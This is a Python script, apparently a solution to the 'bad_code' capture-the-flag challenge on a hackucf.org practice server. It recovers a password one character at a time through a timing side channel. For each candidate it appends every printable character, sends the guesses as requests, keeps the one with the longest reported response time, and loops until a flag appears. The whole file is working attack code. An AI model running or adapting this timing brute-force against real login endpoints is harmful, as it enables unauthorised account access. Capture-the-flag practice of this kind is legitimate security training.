import string
import itertools
import requests
import re

def main():
    # Get the current working password
    working_password = input("Enter your current working password: ")
    url = 'http://ctf.hackucf.org:4000/bad_code/bad_code.php'
    # Create a character set with alphanumeric characters and special characters
    characters = string.ascii_letters + string.digits + string.punctuation + " "
    flag_pattern = re.compile(r"flag\{.+?\}")
    flag_found = False
    # Generate all possible permutations by appending characters to the working password
    while not flag_found:
        permutations = [working_password + char for char in characters]
        max_response_time = 0
        best_candidate = ''

        for password_attempt in permutations:
            response_time, response_text = send_request(url, password_attempt)
            if response_time > max_response_time:
                max_response_time = response_time
                best_candidate = password_attempt
                print(f'Current best candidate {best_candidate}, with reponse time {max_response_time}')

            # Check if the flag is in the response
            if flag_pattern.search(response_text):
                flag_found = True
                print(f"Flag found: {response_text}")
                break

        if not flag_found:
            # Update the working password with the best candidate
            working_password = best_candidate
            print(f"This rounds best password candidate: {best_candidate}, with response time {max_response_time}")               

def send_request(url, password_attempt):
    params = {"passwd": password_attempt}
    response = requests.get(url, params=params)
    response_time_pattern = re.compile(r"Response generated in: <time>(\d+\.\d+)</time>")
    match = response_time_pattern.search(response.text)

    if match:
        response_time = float(match.group(1))
        return response_time, response.text
    else:
        print("Failed to extract response time")
        return 0, response.text

if __name__ == "__main__":
    main()
